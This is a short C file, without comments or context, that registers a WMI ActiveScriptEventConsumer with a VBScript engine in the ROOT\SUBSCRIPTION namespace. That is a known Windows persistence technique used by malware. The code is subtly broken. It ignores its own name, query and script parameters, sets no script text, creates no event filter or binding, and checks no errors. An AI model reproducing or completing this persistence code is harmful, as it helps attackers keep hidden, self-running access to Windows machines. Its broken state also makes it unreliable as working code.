#include <windows.h>
#include <wbemidl.h>

void __attribute__((noinline)) __attribute__((used)) routine_v1(const char* name, const char* query, const char* script){
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    CoInitializeEx(0, COINIT_MULTITHREADED);
    CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
    pLoc->lpVtbl->ConnectServer(pLoc, SysAllocString(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, 0, 0, 0, &pSvc);
    
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInst = NULL;
    pSvc->lpVtbl->GetObject(pSvc, SysAllocString(L"ActiveScriptEventConsumer"), 0, NULL, &pClass, NULL);
    pClass->lpVtbl->SpawnInstance(pClass, 0, &pInst);
    VARIANT v;
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(L"MyConsumer");
    pInst->lpVtbl->Put(pInst, L"Name", 0, &v, 0);
    v.bstrVal = SysAllocString(L"VBScript");
    pInst->lpVtbl->Put(pInst, L"ScriptingEngine", 0, &v, 0);
    pSvc->lpVtbl->PutInstance(pSvc, pInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    
    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();
}